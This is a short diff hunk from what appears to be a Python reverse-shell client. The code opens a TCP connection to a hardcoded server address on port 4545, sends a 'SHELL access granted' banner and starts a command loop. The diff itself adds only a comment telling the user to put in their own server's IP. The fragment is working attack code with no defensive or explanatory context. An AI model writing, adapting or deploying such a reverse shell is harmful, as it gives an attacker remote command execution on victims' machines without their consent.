@@ -3,13 +3,14 @@ import os
 import subprocess
 
 client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-host="172.16.166.184"
+host="172.16.166.184" #Put your server's IP here 
 port=4545
 ip=socket.gethostbyname(socket.gethostname())
 
 client.connect((host,port))
 msg="SHELL access granted. Type commands...\n"
 client.send(str.encode(msg))
+
 while True:
     currentwd=os.getcwd()
     msg=''
